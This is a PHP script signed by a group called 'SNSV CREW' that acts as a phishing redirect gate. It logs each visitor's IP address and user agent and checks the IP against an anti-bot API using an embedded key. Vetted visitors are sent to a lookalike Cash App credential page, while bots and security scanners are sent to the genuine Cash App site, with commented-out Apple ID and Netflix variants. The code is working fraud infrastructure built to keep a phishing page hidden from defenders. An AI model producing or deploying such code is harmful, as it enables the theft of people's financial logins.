<?php
## Block Redirect
## SNSV CREW
## NEVER GIVE UP
## CREATED ON 20 AGUSTUS 2020
## MADE WITH LOVE


###############################################################################################################
##    ______    ____  _____    ______    ____   ____       ______   _______      ________   ____      ____   ##
##  .' ____ \  |_   \|_   _| .' ____ \  |_  _| |_  _|    .' ___  | |_   __ \    |_   __  | |_  _|    |_  _|  ##
##  | (___ \_|   |   \ | |   | (___ \_|   \ \   / /     / .'   \_|   | |__) |     | |_ \_|   \ \  /\  / /    ##
##   _.____`.    | |\ \| |    _.____`.     \ \ / /      | |          |  __ /      |  _| _     \ \/  \/ /     ##
##  | \____) |  _| |_\   |_  | \____) |     \ ' /       \ `.___.'\  _| |  \ \_   _| |__/ |     \  /\  /      ##
##   \______.' |_____|\____|  \______.'      \_/         `.____ .' |____| |___| |________|      \/  \/       ##
##                                                                                                           ##
##                                             We Are Family                                                 ##
###############################################################################################################

$ip = $_SERVER['REMOTE_ADDR'];
$tanggalnya = date("F j, Y, g:i a");
$linkskemnya = "https://cashapp-secure.com/access";
$ua = $_SERVER['HTTP_USER_AGENT'];

$lockcountry = "0"; 	## 1 = ON , 0 = OFF
$countrylock = "US"; 	## KODE NEGARA
$blocker = "1"; 		## 1 OSTRAVA BLOCKER , 2 IP QUALITY  , 3 PROXYCHECK.IO
$keyostrava = "";		## MASUKAN KEY OSTRAVA 
$keyipquality = "";		## MASUKAN KEY IPQUALITY
$keyproxycheck = "";	## MASUKAN KEY PROXYCHECK -> PAKAI PUBLIC KEY 
$maxopen = "1";			## 1 = ON , 0 = OFF  -> 1 IP MAX 3X OPEN LINK 

//$blocklink = "https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24";
//$blocklink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjt6p2yk9rrAhXCfH0KHRGDCPAQFjAAegQIARAB&url=https%3A%2F%2Fwww.netflix.com%2FLogin&usg=AOvVaw1k5yNvDqldcsM1ZwLtuFR3";
$blocklink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwily4Kv7_XrAhV6IbcAHXzhAX0QFjACegQIARAB&url=https%3A%2F%2Fcash.app%2Faccount&usg=AOvVaw3WX0Ia4KxY4RzjYwk5FzQZ";

function http_request($url){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    $output = curl_exec($ch); 
    curl_close($ch);      
    return $output;
}
					if($blocker == '1') {
					$profile = http_request("https://ostrava.run/api/v1/ip_lookup?key=ee676eabe2e0ab20020cd88cc8a6206342ea5b5b&ip=".$ip."");
					$profilex = json_decode($profile);
					$logs = fopen("snsv_visitor.txt","a");
					fwrite($logs,"[$tanggalnya] - [$ip] - [$profilex->countryName] - [$ua]"."\n");
					fclose($logs);
						if($profilex->recommend_status == "pass"){
						echo "<meta http-equiv='refresh' content='0;url=$linkskemnya'>";
						//header("location: $linkskemnya");
						exit();
						}else{
						//$file = fopen(".htaccess","a");
						//fwrite($file, "deny from $ip"."\n");
						//fclose($file);
						$click = fopen("snsv_blocklist.txt","a");
						fwrite($click,"[$tanggalnya] - [$ip] - [$profilex->countryName] - [Blocked by OstravaBOT]"."\n");
						fclose($click);
						//header("location: $blocklink");
						echo "<meta http-equiv='refresh' content='0;url=$blocklink'>";
						exit();
				}
}



?>